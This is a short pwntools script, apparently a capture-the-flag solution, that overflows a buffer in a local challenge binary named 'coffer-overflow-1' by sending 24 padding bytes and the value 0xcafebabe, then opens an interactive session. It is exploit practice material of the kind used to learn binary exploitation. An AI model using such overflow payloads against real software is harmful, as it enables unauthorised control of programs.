from pwn import *

io = process('./coffer-overflow-1')

payload = cyclic(24) + p64(0xcafebabe)

io.sendline(payload)
io.interactive()
